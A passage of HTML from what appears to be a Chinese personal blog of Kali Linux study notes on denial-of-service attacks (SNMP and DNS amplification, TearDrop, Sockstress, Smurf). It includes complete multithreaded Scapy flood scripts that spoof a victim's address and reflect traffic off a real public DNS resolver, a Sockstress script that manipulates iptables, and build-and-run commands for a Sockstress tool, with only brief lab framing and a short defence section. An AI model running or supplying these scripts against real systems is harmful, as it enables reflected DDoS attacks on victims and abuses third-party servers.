+<li>s.PDU=b </li>
+<li>s.display()</li>
+</ul>
+</li>
+<li>发送数据包<ul>
+<li>r= (i/u/s)</li>
+<li>r.display()</li>
+<li>Sr1(r)</li>
+</ul>
+</li>
+<li>▲ Kali开启Wireshark抓包，监听Kali的IP地址，查看返回的数据包的大小（出现分段数据包）</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#_*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">from scapy.all import *</span><br><span class="line">from time import sleep</span><br><span class="line">import thread</span><br><span class="line">import random</span><br><span class="line">import logging</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 6:</span><br><span class="line">    print &quot;用法：./dns_flood.py [利用的IP地址] [攻击的IP地址] [回包数据大小] [团体] [线程数]&quot;</span><br><span class="line">    print &quot;举例：./dns_flood.py 1.1.1.1 1.1.1.2 100 asd 20&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">target = str(sys.argv[1])</span><br><span class="line">tar = str(sys.argv[2])</span><br><span class="line">datapacket = int(sys.argv[3])</span><br><span class="line">person = str(sys.argv[4])</span><br><span class="line">threads = int(sys.argv[5])</span><br><span class="line"></span><br><span class="line">print &quot;正在执行 SNMP Flood 攻击，按 Ctrl+C 停止攻击&quot;</span><br><span class="line">def snmpflood(target,datapacket,person,tar):</span><br><span class="line">    while 0 == 0:</span><br><span class="line">        x = random.randint(0,65535)</span><br><span class="line">        send(IP(dst=target,src=tar)/UDP(sport=x,dport=161)/SNMP(community=person,PDU=SNMPbulk(max_repetitions=datapacket,varbindlist=[SNMPvarbind(oid=ASN1_OID(&apos;1.3.6.1.2.1.1&apos;)),SNMPvarbind(oid=ASN1_OID(&apos;1.3.6.1.2.1.19.1.3&apos;))])),verbose=0)</span><br><span class="line"></span><br><span class="line">for x in range(0,threads):</span><br><span class="line">    thread.start_new_thread(snmpflood,(target,datapacket,person,tar))</span><br><span class="line"></span><br><span class="line">while 0 == 0:</span><br><span class="line">    sleep(1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/kali/kali-notepad/SNMP%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB.PNG" alt="SNMP放大攻击"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%89)%EF%BC%9ADoS--DNS%E6%94%BE%E5%A4%A7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%89)%EF%BC%9ADoS--DNS%E6%94%BE%E5%A4%A7/" itemprop="url">Kali Linux笔记(八十三)：DoS--DNS放大</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-09T23:49:58+08:00">
+                2020-02-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  488 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-DNS放大攻击"><a href="#1-DNS放大攻击" class="headerlink" title="1. DNS放大攻击"></a>1. DNS放大攻击</h4><ul>
+<li>产生大流量的攻击方法<ul>
+<li>单机的带宽优势</li>
+<li>巨大单机数量形成的流量汇聚</li>
+<li>利用协议特性实现放大效果的流量</li>
+</ul>
+</li>
+<li>DNS协议放大效果<ul>
+<li>查询请求流量小，但响应流量可能非常巨大</li>
+<li><strong><code>🔺命令：dig hp.com @202.96.134.133</code></strong>（流量放大约8倍）</li>
+</ul>
+</li>
+<li>攻击原理<ul>
+<li>伪造源地址为被攻击目标地址，向递归域名查询服务器发起查询</li>
+<li>DNS服务器成为流量放大和实施攻击者，大量DNS服务器实现DDoS</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-Scapy构造攻击数据包"><a href="#2-Scapy构造攻击数据包" class="headerlink" title="2. Scapy构造攻击数据包"></a>2. Scapy构造攻击数据包</h4><ul>
+<li>Kali开启Wireshark抓包，监听Kali的IP地址</li>
+<li>IP/UDP/DNS/DNS查询内容</li>
+<li>IP头构造<ul>
+<li>i=IP()</li>
+<li>i.dst=”202.96.134.133”</li>
+<li>i.src=”被攻击者的IP”</li>
+<li>i.display()</li>
+</ul>
+</li>
+<li>UDP头构造<ul>
+<li>u=udp()</li>
+<li>u.display()</li>
+</ul>
+</li>
+<li>DNS头构造<ul>
+<li>d=DNS()</li>
+<li>d.rd=1（递归查询）</li>
+<li>d.qdount=1</li>
+<li>d.display()</li>
+</ul>
+</li>
+<li>DNS内容构造<ul>
+<li>q=DNSQR()</li>
+<li>q.qname=”hp.com”</li>
+<li>q.qtype=255（A为默认记录，255即查所有记录）</li>
+<li>q.display()</li>
+</ul>
+</li>
+<li>拼接数据<ul>
+<li>d.qd=q</li>
+<li>d.display()</li>
+</ul>
+</li>
+<li>发送数据包<ul>
+<li>r=(i/u/d)</li>
+<li>r.display()</li>
+<li>sr1(r)</li>
+<li>▲ 发包：send(r)（可用Kali进行发包，物理机进行接收数据包）</li>
+</ul>
+</li>
+<li>▲ 结合IP地址欺骗，利用大量DNS服务器做傀儡攻击目标</li>
+<li><strong><code>🔺命令：./dns_flood.py 被攻击者的IP hp.com 20</code></strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#_*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">from scapy.all import *</span><br><span class="line">from time import sleep</span><br><span class="line">import thread</span><br><span class="line">import random</span><br><span class="line">import logging</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 4:</span><br><span class="line">    print &quot;用法：./dns_flood.py [IP地址] [利用的域名] [线程数]&quot;</span><br><span class="line">    print &quot;举例：./dns_flood.py 1.1.1.1 hp.com 20&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">target = str(sys.argv[1])</span><br><span class="line">dnsname = str(sys.argv[2])</span><br><span class="line">threads = int(sys.argv[3])</span><br><span class="line"></span><br><span class="line">print &quot;正在执行 DNS Flood 攻击，按 Ctrl+C 停止攻击&quot;</span><br><span class="line">def dnsflood(target,dnsname):</span><br><span class="line">    while 0 == 0:</span><br><span class="line">        x = random.randint(0,65535)</span><br><span class="line">        send(IP(dst=&quot;202.96.134.133&quot;,src=target)/UDP(sport=x,dport=53)/DNS(rd=1,qdcount=1,qd=DNSQR(qname=dnsname,qtype=255)),verbose=0)</span><br><span class="line"></span><br><span class="line">for x in range(0,threads):</span><br><span class="line">    thread.start_new_thread(dnsflood,(target,dnsname))</span><br><span class="line"></span><br><span class="line">while 0 == 0:</span><br><span class="line">    sleep(1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/kali/kali-notepad/DNS%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB.PNG" alt="DNS放大攻击"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%BA%8C)%EF%BC%9ATearDrop/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%BA%8C)%EF%BC%9ATearDrop/" itemprop="url">Kali Linux笔记(八十二)：TearDrop</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-09T21:40:17+08:00">
+                2020-02-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  189 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  1 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-TearDrop"><a href="#1-TearDrop" class="headerlink" title="1. TearDrop"></a>1. TearDrop</h4><ul>
+<li>主要针对早期微软操作系统（95、98、3.X、nt）<ul>
+<li>近些年有人发现对2.x版本的android系统、6.0 IOS系统攻击有效</li>
+</ul>
+</li>
+<li>原理很有趣<ul>
+<li>使用IP分段偏移值实现分段覆盖，接收端处理分段覆盖时可被拒绝服务</li>
+</ul>
+</li>
+<li>攻击效果<ul>
+<li>被攻击者蓝屏、重启、卡死</li>
+</ul>
+</li>
+<li>IP分段偏移值的数据包，以Window10下的 <strong><code>🔺命令：ping -l 4000 192.168.0.1</code></strong></li>
+</ul>
+<p><img src="/images/kali/kali-notepad/IP%E5%88%86%E6%AE%B5%E5%81%8F%E7%A7%BB%E5%80%BC.PNG" alt="IP分段偏移值"></p>
+<p><img src="/images/kali/kali-notepad/TearDrop.PNG" alt="TearDrop攻击"></p>
+<ul>
+<li>Ping大包，比较正常分段与teardrop攻击流量的区别</li>
+<li>针对早期windows系统SMB协议的攻击<ul>
+<li><strong><code>🔺命令：./teardrop_smb.py</code></strong></li>
+<li>针对Android、IOS系统的攻击</li>
+<li><strong><code>🔺命令：./teardrop_android_ios.py</code></strong></li>
+<li>攻击向量并不确定，要是具体协议分析</li>
+<li>▲ 2020.2.9搜索不到两个python文件</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%80)%EF%BC%9ASockstress/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%80)%EF%BC%9ASockstress/" itemprop="url">Kali Linux笔记(八十一)：Sockstress</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-09T21:34:04+08:00">
+                2020-02-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  857 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  3 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-Sockstress"><a href="#1-Sockstress" class="headerlink" title="1. Sockstress"></a>1. Sockstress</h4><ul>
+<li>2008年由Jack C.Louis发现</li>
+<li>针对TCP服务的拒绝服务攻击<ul>
+<li>消耗被攻击目标系统资源，不消耗网络带宽自宽</li>
+<li>与攻击目标建立socket连接</li>
+<li>▲ 设计原理：完成三次握手，最后的ACK包window大小为0（客户端不接收数据）</li>
+<li>攻击者资源消耗小（CPU、内存、带宽）</li>
+<li>异步攻击，单机可拒绝服务高配资源服务器</li>
+<li>Window窗口实现TCP流控</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-实验准备"><a href="#2-实验准备" class="headerlink" title="2. 实验准备"></a>2. 实验准备</h4><ul>
+<li>Kali（攻击者）<ul>
+<li>网卡方式为NAT/Bridge方式，NAT/桥接到无线网络，检查网络</li>
+</ul>
+</li>
+<li>Metasploit（被攻击者）<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-实验–Python脚本"><a href="#3-实验–Python脚本" class="headerlink" title="3. 实验–Python脚本"></a>3. 实验–Python脚本</h4><ul>
+<li>Metasploit（被攻击者）<ul>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+</ul>
+</li>
+<li>Kali（攻击者）<ul>
+<li>python脚本：<strong><code>🔺命令：./sockstress.py Metasploit的IP 21 200</code></strong></li>
+<li>▲ 2020.2.9此脚本攻击效果甚微弱</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#_*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">from scapy.all import *</span><br><span class="line">from time import sleep</span><br><span class="line">import thread</span><br><span class="line">import logging</span><br><span class="line">import os</span><br><span class="line">import signal</span><br><span class="line">import sys</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 4:</span><br><span class="line">    print &quot;用法：./sockstress.py [目标IP] [端口] [线程数]&quot;</span><br><span class="line">    print &quot;举例：./sockstress.py 10.0.0.5 21 20 ## 请确定被攻击端口处于开放状态&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">target = str(sys.argv[1])</span><br><span class="line">dstport = int(sys.argv[2])</span><br><span class="line">threads = int(sys.argv[3])</span><br><span class="line"></span><br><span class="line">## 攻击函数</span><br><span class="line">def sockstress(target,dstport):</span><br><span class="line">    while 0 == 0:</span><br><span class="line">        try:</span><br><span class="line">            x = random.randint(0,65535)</span><br><span class="line">            response = sr1(IP(dst=target)/TCP(sport=x,dport=dstport,flags=&quot;S&quot;),timeout=1,verbose=0)</span><br><span class="line">            send(IP(dst=target)/TCP(sport=x,dport=dstport,window=0,flags=&quot;A&quot;,ack=(response[TCP].seq+1))/&apos;\x00\x00&apos;,verbose=0)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">## 停止攻击函数</span><br><span class="line">def shutdown(signal,frame):</span><br><span class="line">    print &quot;正在恢复iptables 规则&quot;</span><br><span class="line">    os.system(&apos;iptables -D OUTPUT -p tcp --tcp-flags RST RST -d&apos;+target+&apos; -j DROP&apos;)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">## 添加iptables规则</span><br><span class="line">os.system(&apos;iptables -A OUTPUT -p tcp --tcp-flags RST RST -d&apos;+target+&apos; -j DROP&apos;)</span><br><span class="line">signal.signal(signal.SIGINT,shutdown)</span><br><span class="line"></span><br><span class="line">## 多线程攻击</span><br><span class="line">print &quot;\n攻击正在进行...按 Ctrl+C 停止攻击&quot;</span><br><span class="line">for x in range(0,threads):</span><br><span class="line">    thread.start_new_thread(sockstress,(target,dstport))</span><br><span class="line"></span><br><span class="line">## 永远执行</span><br><span class="line">while 0==0:</span><br><span class="line">    sleep(1)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Metasploit（被攻击者）<ul>
+<li><strong><code>🔺命令：top</code></strong>查看系统性能，重点关注CPU、内存、SWAP是否提高或者不变</li>
+<li><strong><code>🔺命令：netstat -pantu | grep ESTAB | wc -l</code></strong>（查看已经建立的连接数）</li>
+<li><strong><code>🔺命令：Free -m</code></strong>（查看系统所用资源）</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/kali/kali-notepad/sockstress%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B5%84%E6%BA%90%E5%9B%BE.PNG" alt="服务器资源图"></p>
+<h4 id="4-实验–C脚本"><a href="#4-实验–C脚本" class="headerlink" title="4. 实验–C脚本"></a>4. 实验–C脚本</h4><ul>
+<li>Metasploit（被攻击者）<ul>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+</ul>
+</li>
+<li>Kali（攻击者）<ul>
+<li>防火墙规则：<strong><code>🔺命令：iptables -A OUTPUT -p TCP --tcp-flags rst rst -d Metasploit的IP -j DROP</code></strong></li>
+<li>下载地址：<a href="https://github.com/defuse/sockstress" target="_blank" rel="noopener">https://github.com/defuse/sockstress</a> </li>
+<li><strong><code>🔺命令：gcc -Wall -c sockstress.c</code></strong> </li>
+<li><strong><code>🔺命令：gcc -pthread -o sockstress sockstress.o</code></strong> </li>
+<li><strong><code>🔺命令：./sockstress Metasploit的IP:80 eth0</code></strong> </li>
+<li><strong><code>🔺命令：./sockstress Metasploit的IP:80 eth0 -p payloads/http -d 10</code></strong></li>
+</ul>
+</li>
+<li>Metasploit（被攻击者）<ul>
+<li><strong><code>🔺命令：top</code></strong>查看系统性能，重点关注CPU、内存、SWAP是否提高或者不变</li>
+<li><strong><code>🔺命令：netstat -pantu | grep ESTAB | wc -l</code></strong>（查看已经建立的连接数）</li>
+<li><strong><code>🔺命令：free -m</code></strong>（查看系统所用资源）</li>
+</ul>
+</li>
+</ul>
+<h4 id="5-防御措施"><a href="#5-防御措施" class="headerlink" title="5. 防御措施"></a>5. 防御措施</h4><ul>
+<li>直到今天sockstress攻击仍然是一种很有效的DoS攻击方式</li>
+<li>由于建立完整的TCP三步握手，因此使用syn cookie防御无效（syn cookie对半步连接有效）</li>
+<li>根本的防御方法是采用白名单（不实际）</li>
+<li>折中对策：限制单位时间内每IP建的TCP连接数<ul>
+<li>封杀每30秒与80端口建立连接10个的IP地址</li>
+<li><strong><code>🔺命令：iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --set</code></strong></li>
+<li><strong><code>🔺命令：iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 -j DROP</code></strong></li>
+<li>以上规则对DDoS攻击无效</li>
+</ul>
+</li>
+<li>▲ 可在Metasploit中加入iptables规则，Kali进行DoS尝试</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81)%EF%BC%9ASmurf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81)%EF%BC%9ASmurf/" itemprop="url">Kali Linux笔记(八十)：Smurf</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-09T21:27:53+08:00">
+                2020-02-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  219 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  1 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-Smurf"><a href="#1-Smurf" class="headerlink" title="1. Smurf"></a>1. Smurf</h4><ul>
+<li>世界上最古老的DDoS攻击<ul>
+<li>向广播地址发送伪造源地址的ICMP echo Requset（ping）包</li>
+<li>LAN所有计算机向伪造源地址返回响应包</li>
+<li>对现代操作系统几乎失效（不响应目标为广播的ping）</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-实验准备"><a href="#2-实验准备" class="headerlink" title="2. 实验准备"></a>2. 实验准备</h4><ul>
+<li>Kali（攻击者）<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+</ul>
+</li>
+<li>Metasploit（被攻击者）<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-实验"><a href="#3-实验" class="headerlink" title="3. 实验"></a>3. 实验</h4><ul>
+<li>Metasploit（被攻击者）<ul>
+<li>ifconfig查看IP地址</li>
+</ul>
+</li>
+<li>Kali（攻击者）<ul>
+<li>Scapy<ul>
+<li>i=IP() </li>
+<li>i.src=”Metasploit的IP地址”</li>
